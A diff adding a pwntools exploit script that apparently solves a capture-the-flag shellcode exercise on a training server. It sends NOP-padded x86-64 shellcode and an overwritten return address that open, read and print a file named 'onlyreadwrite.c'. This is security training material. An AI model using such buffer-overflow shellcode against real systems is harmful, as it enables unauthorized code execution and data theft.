@@ -1,0 +1,22 @@
+from pwn import *
+
+
+run_local = False
+if run_local:
+	s = ssh(host='localhost',user='acidburn',port=2222)
+	r= s.process('/home/acidburn/Desktop/malicious/shell/7/onlyreadwrite')
+	#pid=gdb.attach(r)
+	#input("wait")
+else:
+	r=remote("bin.training.jinblack.it",2006)
+
+
+shellcode = b"\x31\xC0\xFF\xC0\xFF\xC0\x31\xF6\x48\xBB\x77\x72\x69\x74\x65\x2E\x63\x00\x53\x48\xBB\x6F\x6E\x6C\x79\x72\x65\x61\x64\x53\x48\x89\xE7\x0F\x05\x48\x89\xC7\x31\xC0\x48\x89\xE6\xBA\x20\x00\x00\x00\x0F\x05\x31\xC0\xFF\xC0\x31\xFF\xFF\xC7\x48\x89\xE6\x0F\x05"
+
+shellcode = shellcode.ljust(1016,b"\x90") + p64(0x6020c0)
+
+r.send(shellcode)
+
+
+
+r.interactive()
